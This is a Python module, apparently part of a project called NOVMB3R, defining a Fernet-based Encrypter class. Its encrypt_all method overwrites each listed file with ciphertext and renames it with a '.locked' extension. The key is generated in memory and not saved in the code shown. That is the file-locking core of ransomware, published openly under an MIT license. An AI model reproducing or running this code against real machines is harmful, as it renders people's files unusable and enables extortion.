#  _   _  _____     ____  __ ____ _____ ____
# | \ | |/ _ \ \   / /  \/  | __ )___ /|  _ \
# |  \| | | | \ \ / /| |\/| |  _ \ |_ \| |_) |
# | |\  | |_| |\ V / | |  | | |_) |__) |  _ <
# |_| \_|\___/  \_/  |_|  |_|____/____/|_| \_\
#
# MIT License
#
# Copyright (c) 2024 Daniel Lima
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

from pathlib import Path
from cryptography.fernet import Fernet


class Encrypter:
    """
    A class for encrypting and decrypting files and
    bytes using the Fernet symmetric encryption scheme.
    """

    def __init__(self) -> None:
        self.key: bytes = self.gen_key()
        self.fernet: Fernet = Fernet(self.key)

    def gen_key(self) -> bytes:
        """
        Generates a new encryption key for the Fernet encryption.

        Returns:
            bytes: A newly generated encryption key.
        """
        return Fernet.generate_key()

    def encrypt_all(self, files: list[Path]) -> None:
        """
        Encrypts all files provided in the list and renames
        them by appending the '.locked' extension.

        Args:
            files (list[Path]): A list of file paths to be encrypted.
        """
        for file in files:
            file.write_bytes(self.encrypt_bytes(file.read_bytes()))
            file.rename(file.name + ".locked")

    def encrypt_bytes(self, file_bytes: bytes) -> bytes:
        """
        Encrypts the given byte content using the Fernet encryption scheme.

        Args:
            file_bytes (bytes): The byte content to be encrypted.

        Returns:
            bytes: The encrypted byte content.
        """
        return self.fernet.encrypt(file_bytes)

    def decrypt_bytes(self, encrypted_bytes: bytes) -> bytes:
        """
        Decrypts the given encrypted byte content using the Fernet encryption scheme.

        Args:
            encrypted_bytes (bytes): The encrypted byte content to be decrypted.

        Returns:
            bytes: The decrypted byte content.
        """
        return self.fernet.decrypt(encrypted_bytes)
